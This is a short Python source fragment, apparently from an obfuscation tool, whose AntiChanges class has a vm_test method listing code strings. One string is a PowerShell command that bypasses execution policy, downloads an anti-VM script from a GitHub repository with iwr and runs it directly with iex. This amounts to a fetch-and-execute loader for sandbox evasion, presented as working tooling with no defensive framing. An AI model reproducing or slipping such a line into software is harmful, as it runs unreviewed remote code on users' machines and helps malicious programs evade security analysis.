...
class AntiChanges:
    ...
    def vm_test():
        codes = [
            ...
            """powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "iex (iwr -uri 'https://github.com/KDot227/SomalifuscatorV2/blob/main/src/util/methods/anti_methods/antivm.ps1' -useb)\"""",
        ]
